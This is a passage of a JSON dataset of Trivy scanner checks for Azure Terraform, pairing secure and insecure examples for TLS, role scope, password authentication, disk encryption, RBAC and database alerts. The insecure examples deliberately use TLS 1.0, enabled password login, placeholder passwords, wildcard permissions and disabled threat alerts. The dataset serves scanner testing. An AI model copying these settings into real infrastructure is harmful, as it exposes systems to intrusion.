        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/appservice/use_secure_tls_policy.yaml",
        "local_path": "azure/appservice/use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#min_tls_version"
            ],
            "good": [
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}",
              "resource \"azurerm_app_service\" \"good_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  site_config {\n    min_tls_version = \"1.2\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_app_service\" \"bad_example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n\n  site_config {\n    min_tls_version = \"1.0\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-AUTHORIZATION-LIMIT_ROLE_ACTIONS",
        "title": "Limit Role Actions",
        "provider": "azure",
        "service": "authorization",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions\n  good:\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions     = [\"*\"]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          data.azurerm_subscription.primary.id,\n        ]\n      }\n  bad:\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions     = [\"*\"]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          \"/\"\n        ]\n      }\n",
        "file_name": "limit_role_actions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/authorization/limit_role_actions.yaml",
        "local_path": "azure/authorization/limit_role_actions.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions"
            ],
            "good": [
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions     = [\"*\"]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id,\n  ]\n}"
            ],
            "bad": [
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions     = [\"*\"]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    \"/\"\n  ]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-AUTHORIZATION-PREVENT_CUSTOM_ROLE_CREATION",
        "title": "Prevent Custom Role Creation",
        "provider": "azure",
        "service": "authorization",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions\n  good:\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions = [\n            \"Microsoft.Authorization/roleDefinitions/read\",\n            \"Microsoft.Resources/subscriptions/resourceGroups/read\",\n            \"Microsoft.Storage/storageAccounts/read\"\n          ]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          data.azurerm_subscription.primary.id,\n        ]\n      }\n  bad:\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions = [\n            \"Microsoft.Authorization/roleDefinitions/write\"\n          ]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          data.azurerm_subscription.primary.id,\n        ]\n      }\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions = [\n            \"Microsoft.Authorization/*\"\n          ]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          data.azurerm_subscription.primary.id,\n        ]\n      }\n    - |-\n      data \"azurerm_subscription\" \"primary\" {\n      }\n\n      resource \"azurerm_role_definition\" \"example\" {\n        name        = \"my-custom-role\"\n        scope       = data.azurerm_subscription.primary.id\n        description = \"This is a custom role created via Terraform\"\n\n        permissions {\n          actions = [\n            \"*\"\n          ]\n          not_actions = []\n        }\n\n        assignable_scopes = [\n          data.azurerm_subscription.primary.id,\n        ]\n      }\n",
        "file_name": "prevent_custom_role_creation.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/authorization/prevent_custom_role_creation.yaml",
        "local_path": "azure/authorization/prevent_custom_role_creation.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions"
            ],
            "good": [
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions = [\n      \"Microsoft.Authorization/roleDefinitions/read\",\n      \"Microsoft.Resources/subscriptions/resourceGroups/read\",\n      \"Microsoft.Storage/storageAccounts/read\"\n    ]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id,\n  ]\n}"
            ],
            "bad": [
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions = [\n      \"Microsoft.Authorization/roleDefinitions/write\"\n    ]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id,\n  ]\n}",
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions = [\n      \"Microsoft.Authorization/*\"\n    ]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id,\n  ]\n}",
              "data \"azurerm_subscription\" \"primary\" {\n}\n\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"my-custom-role\"\n  scope       = data.azurerm_subscription.primary.id\n  description = \"This is a custom role created via Terraform\"\n\n  permissions {\n    actions = [\n      \"*\"\n    ]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id,\n  ]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-COMPUTE-DISABLE_PASSWORD_AUTHENTICATION",
        "title": "Disable Password Authentication",
        "provider": "azure",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/linux_virtual_machine#disable_password_authentication\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#disable_password_authentication\n  good:\n    - |-\n      resource \"azurerm_linux_virtual_machine\" \"good_linux_example\" {\n        name                = \"good-linux-machine\"\n        resource_group_name = azurerm_resource_group.example.name\n        location            = azurerm_resource_group.example.location\n        size                = \"Standard_F2\"\n        admin_username      = \"adminuser\"\n        admin_password      = \"somePassword\"\n\n        admin_ssh_key {\n          username   = \"adminuser\"\n          public_key = file(\"~/.ssh/id_rsa.pub\")\n        }\n      }\n    - |-\n      resource \"azurerm_virtual_machine\" \"good_example\" {\n        name                = \"good-linux-machine\"\n        resource_group_name = azurerm_resource_group.example.name\n        location            = azurerm_resource_group.example.location\n        size                = \"Standard_F2\"\n        admin_username      = \"adminuser\"\n\n\n        os_profile_linux_config {\n          ssh_keys = [{\n            key_data = file(\"~/.ssh/id_rsa.pub\")\n            path     = \"~/.ssh/id_rsa.pub\"\n          }]\n\n          disable_password_authentication = true\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_linux_virtual_machine\" \"bad_linux_example\" {\n        name                            = \"bad-linux-machine\"\n        resource_group_name             = azurerm_resource_group.example.name\n        location                        = azurerm_resource_group.example.location\n        size                            = \"Standard_F2\"\n        admin_username                  = \"adminuser\"\n        admin_password                  = \"somePassword\"\n        disable_password_authentication = false\n      }\n    - |-\n      resource \"azurerm_virtual_machine\" \"bad_example\" {\n        name                = \"bad-linux-machine\"\n        resource_group_name = azurerm_resource_group.example.name\n        location            = azurerm_resource_group.example.location\n        size                = \"Standard_F2\"\n        admin_username      = \"adminuser\"\n        admin_password      = \"somePassword\"\n\n        os_profile {\n          computer_name  = \"hostname\"\n          admin_username = \"testadmin\"\n          admin_password = \"Password1234!\"\n        }\n\n        os_profile_linux_config {\n          disable_password_authentication = false\n        }\n      }\n",
        "file_name": "disable_password_authentication.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/compute/disable_password_authentication.yaml",
        "local_path": "azure/compute/disable_password_authentication.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/linux_virtual_machine#disable_password_authentication",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#disable_password_authentication"
            ],
            "good": [
              "resource \"azurerm_linux_virtual_machine\" \"good_linux_example\" {\n  name                = \"good-linux-machine\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  size                = \"Standard_F2\"\n  admin_username      = \"adminuser\"\n  admin_password      = \"somePassword\"\n\n  admin_ssh_key {\n    username   = \"adminuser\"\n    public_key = file(\"~/.ssh/id_rsa.pub\")\n  }\n}",
              "resource \"azurerm_virtual_machine\" \"good_example\" {\n  name                = \"good-linux-machine\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  size                = \"Standard_F2\"\n  admin_username      = \"adminuser\"\n\n\n  os_profile_linux_config {\n    ssh_keys = [{\n      key_data = file(\"~/.ssh/id_rsa.pub\")\n      path     = \"~/.ssh/id_rsa.pub\"\n    }]\n\n    disable_password_authentication = true\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_linux_virtual_machine\" \"bad_linux_example\" {\n  name                            = \"bad-linux-machine\"\n  resource_group_name             = azurerm_resource_group.example.name\n  location                        = azurerm_resource_group.example.location\n  size                            = \"Standard_F2\"\n  admin_username                  = \"adminuser\"\n  admin_password                  = \"somePassword\"\n  disable_password_authentication = false\n}",
              "resource \"azurerm_virtual_machine\" \"bad_example\" {\n  name                = \"bad-linux-machine\"\n  resource_group_name = azurerm_resource_group.example.name\n  location            = azurerm_resource_group.example.location\n  size                = \"Standard_F2\"\n  admin_username      = \"adminuser\"\n  admin_password      = \"somePassword\"\n\n  os_profile {\n    computer_name  = \"hostname\"\n    admin_username = \"testadmin\"\n    admin_password = \"Password1234!\"\n  }\n\n  os_profile_linux_config {\n    disable_password_authentication = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-COMPUTE-ENABLE_DISK_ENCRYPTION",
        "title": "Enable Disk Encryption",
        "provider": "azure",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/managed_disk\n  good:\n    - |-\n      resource \"azurerm_managed_disk\" \"good_example\" {\n        encryption_settings {\n          enabled = true\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_managed_disk\" \"bad_example\" {\n        encryption_settings {\n          enabled = false\n        }\n      }\n",
        "file_name": "enable_disk_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/compute/enable_disk_encryption.yaml",
        "local_path": "azure/compute/enable_disk_encryption.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/managed_disk"
            ],
            "good": [
              "resource \"azurerm_managed_disk\" \"good_example\" {\n  encryption_settings {\n    enabled = true\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_managed_disk\" \"bad_example\" {\n  encryption_settings {\n    enabled = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-COMPUTE-NO_SECRETS_IN_CUSTOM_DATA",
        "title": "No Secrets In Custom Data",
        "provider": "azure",
        "service": "compute",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#custom_data\n  good:\n    - |-\n      resource \"azurerm_virtual_machine\" \"good_example\" {\n        name = \"good_example\"\n        os_profile_linux_config {\n          disable_password_authentication = false\n        }\n        os_profile {\n          custom_data = <<EOF\n      \t\t\texport GREETING=\"Hello there\"\n      \t\t\tEOF\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_virtual_machine\" \"bad_example\" {\n        name = \"bad_example\"\n        os_profile_linux_config {\n          disable_password_authentication = false\n        }\n        os_profile {\n          custom_data = <<EOF\n      \t\t\texport DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n      \t\t\tEOF\n        }\n      }\n",
        "file_name": "no_secrets_in_custom_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/compute/no_secrets_in_custom_data.yaml",
        "local_path": "azure/compute/no_secrets_in_custom_data.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#custom_data"
            ],
            "good": [
              "resource \"azurerm_virtual_machine\" \"good_example\" {\n  name = \"good_example\"\n  os_profile_linux_config {\n    disable_password_authentication = false\n  }\n  os_profile {\n    custom_data = <<EOF\n\t\t\texport GREETING=\"Hello there\"\n\t\t\tEOF\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_virtual_machine\" \"bad_example\" {\n  name = \"bad_example\"\n  os_profile_linux_config {\n    disable_password_authentication = false\n  }\n  os_profile {\n    custom_data = <<EOF\n\t\t\texport DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n\t\t\tEOF\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-CONTAINER-CONFIGURED_NETWORK_POLICY",
        "title": "Configured Network Policy",
        "provider": "azure",
        "service": "container",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#network_policy\n  good:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        network_profile {\n          network_policy = \"calico\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n        network_profile {\n        }\n      }\n",
        "file_name": "configured_network_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/container/configured_network_policy.yaml",
        "local_path": "azure/container/configured_network_policy.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#network_policy"
            ],
            "good": [
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  network_profile {\n    network_policy = \"calico\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n  network_profile {\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-CONTAINER-LIMIT_AUTHORIZED_IPS",
        "title": "Limit Authorized Ips",
        "provider": "azure",
        "service": "container",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#authorized_ip_ranges\n  good:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        api_server_access_profile {\n          authorized_ip_ranges = [\n            \"1.2.3.4/32\"\n          ]\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n      }\n",
        "file_name": "limit_authorized_ips.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/container/limit_authorized_ips.yaml",
        "local_path": "azure/container/limit_authorized_ips.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#authorized_ip_ranges"
            ],
            "good": [
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  api_server_access_profile {\n    authorized_ip_ranges = [\n      \"1.2.3.4/32\"\n    ]\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-CONTAINER-LOGGING",
        "title": "Logging",
        "provider": "azure",
        "service": "container",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#oms_agent\n  good:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        addon_profile {\n          oms_agent {\n            enabled = true\n          }\n        }\n      }\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        oms_agent {\n          log_analytics_workspace_id = \"whatever\"\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n        addon_profile {}\n      }\n",
        "file_name": "logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/container/logging.yaml",
        "local_path": "azure/container/logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#oms_agent"
            ],
            "good": [
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  addon_profile {\n    oms_agent {\n      enabled = true\n    }\n  }\n}",
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  oms_agent {\n    log_analytics_workspace_id = \"whatever\"\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n  addon_profile {}\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-CONTAINER-USE_RBAC_PERMISSIONS",
        "title": "Use Rbac Permissions",
        "provider": "azure",
        "service": "container",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://www.terraform.io/docs/providers/azurerm/r/kubernetes_cluster.html#role_based_access_control\n  good:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        // azurerm < 2.99.0\n        role_based_access_control {\n          enabled = true\n        }\n      }\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n        // azurerm >= 2.99.0\n        role_based_access_control_enabled = true\n      }\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"aks_cluster\" {\n        name                = \"example-aks1\"\n        location            = azurerm_resource_group.example.location\n        resource_group_name = azurerm_resource_group.example.name\n        default_node_pool {\n          name    = \"default\"\n          vm_size = \"Standard_D2_v2\"\n        }\n\n        azure_active_directory_role_based_access_control {\n          managed                = true\n          azure_rbac_enabled     = true\n          admin_group_object_ids = [data.azuread_group.aks_admins.object_id]\n        }\n      }\n  bad:\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n        // azurerm < 2.99.0\n        role_based_access_control {\n          enabled = false\n        }\n      }\n    - |-\n      resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n        // azurerm >= 2.99.0\n        role_based_access_control_enabled = false\n      }\n",
        "file_name": "use_rbac_permissions.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/container/use_rbac_permissions.yaml",
        "local_path": "azure/container/use_rbac_permissions.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://www.terraform.io/docs/providers/azurerm/r/kubernetes_cluster.html#role_based_access_control"
            ],
            "good": [
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  // azurerm < 2.99.0\n  role_based_access_control {\n    enabled = true\n  }\n}",
              "resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n  // azurerm >= 2.99.0\n  role_based_access_control_enabled = true\n}",
              "resource \"azurerm_kubernetes_cluster\" \"aks_cluster\" {\n  name                = \"example-aks1\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  default_node_pool {\n    name    = \"default\"\n    vm_size = \"Standard_D2_v2\"\n  }\n\n  azure_active_directory_role_based_access_control {\n    managed                = true\n    azure_rbac_enabled     = true\n    admin_group_object_ids = [data.azuread_group.aks_admins.object_id]\n  }\n}"
            ],
            "bad": [
              "resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n  // azurerm < 2.99.0\n  role_based_access_control {\n    enabled = false\n  }\n}",
              "resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n  // azurerm >= 2.99.0\n  role_based_access_control_enabled = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-ALL_THREAT_ALERTS_ENABLED",
        "title": "All Threat Alerts Enabled",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#disabled_alerts\n  good:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts            = []\n        retention_days             = 20\n      }\n  bad:\n    - |-\n      resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n        resource_group_name        = azurerm_resource_group.example.name\n        server_name                = azurerm_sql_server.example.name\n        state                      = \"Enabled\"\n        storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key = azurerm_storage_account.example.primary_access_key\n        disabled_alerts = [\n          \"Sql_Injection\",\n          \"Data_Exfiltration\"\n        ]\n        retention_days = 20\n      }\n",
        "file_name": "all_threat_alerts_enabled.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/all_threat_alerts_enabled.yaml",
        "local_path": "azure/database/all_threat_alerts_enabled.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#disabled_alerts"
            ],
            "good": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts            = []\n  retention_days             = 20\n}"
            ],
            "bad": [
              "resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n  resource_group_name        = azurerm_resource_group.example.name\n  server_name                = azurerm_sql_server.example.name\n  state                      = \"Enabled\"\n  storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key = azurerm_storage_account.example.primary_access_key\n  disabled_alerts = [\n    \"Sql_Injection\",\n    \"Data_Exfiltration\"\n  ]\n  retention_days = 20\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-ENABLE_AUDIT",
        "title": "Enable Audit",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_extended_auditing_policy\n  good:\n    - |-\n      resource \"azurerm_sql_server\" \"good_example\" {\n        name                         = \"mssqlserver\"\n        resource_group_name          = azurerm_resource_group.example.name\n        location                     = azurerm_resource_group.example.location\n        version                      = \"12.0\"\n        administrator_login          = \"mradministrator\"\n        administrator_login_password = \"tfsecRocks\"\n      }\n\n      resource \"azurerm_mssql_server_extended_auditing_policy\" \"example\" {\n        server_id                               = azurerm_sql_server.good_example.id\n        storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n        storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n        storage_account_access_key_is_secondary = true\n        retention_in_days                       = 6\n      }\n  bad:\n    - |-\n      resource \"azurerm_sql_server\" \"bad_example\" {\n        name                         = \"mssqlserver\"\n        resource_group_name          = azurerm_resource_group.example.name\n        location                     = azurerm_resource_group.example.location\n        version                      = \"12.0\"\n        administrator_login          = \"mradministrator\"\n        administrator_login_password = \"tfsecRocks\"\n      }\n",
        "file_name": "enable_audit.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/enable_audit.yaml",
        "local_path": "azure/database/enable_audit.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_extended_auditing_policy"
            ],
            "good": [
              "resource \"azurerm_sql_server\" \"good_example\" {\n  name                         = \"mssqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"mradministrator\"\n  administrator_login_password = \"tfsecRocks\"\n}\n\nresource \"azurerm_mssql_server_extended_auditing_policy\" \"example\" {\n  server_id                               = azurerm_sql_server.good_example.id\n  storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n  storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n  storage_account_access_key_is_secondary = true\n  retention_in_days                       = 6\n}"
            ],
            "bad": [
              "resource \"azurerm_sql_server\" \"bad_example\" {\n  name                         = \"mssqlserver\"\n  resource_group_name          = azurerm_resource_group.example.name\n  location                     = azurerm_resource_group.example.location\n  version                      = \"12.0\"\n  administrator_login          = \"mradministrator\"\n  administrator_login_password = \"tfsecRocks\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-ENABLE_SSL_ENFORCEMENT",
        "title": "Enable Ssl Enforcement",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_enforcement_enabled\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_enforcement_enabled\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#ssl_enforcement_enabled\n  good:\n    - |-\n      resource \"azurerm_postgresql_server\" \"good_example\" {\n        name = \"good_example\"\n\n        public_network_access_enabled    = false\n        ssl_enforcement_enabled          = true\n        ssl_minimal_tls_version_enforced = \"TLS1_2\"\n      }\n  bad:\n    - |-\n      resource \"azurerm_postgresql_server\" \"bad_example\" {\n        name = \"bad_example\"\n\n        public_network_access_enabled    = false\n        ssl_enforcement_enabled          = false\n        ssl_minimal_tls_version_enforced = \"TLS1_2\"\n      }\n",
        "file_name": "enable_ssl_enforcement.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/azure/database/enable_ssl_enforcement.yaml",
        "local_path": "azure/database/enable_ssl_enforcement.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_enforcement_enabled",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_enforcement_enabled",
              "https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#ssl_enforcement_enabled"
            ],
            "good": [
              "resource \"azurerm_postgresql_server\" \"good_example\" {\n  name = \"good_example\"\n\n  public_network_access_enabled    = false\n  ssl_enforcement_enabled          = true\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}"
            ],
            "bad": [
              "resource \"azurerm_postgresql_server\" \"bad_example\" {\n  name = \"bad_example\"\n\n  public_network_access_enabled    = false\n  ssl_enforcement_enabled          = false\n  ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AZURE-DATABASE-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "azure",
        "service": "database",
        "language": "terraform",
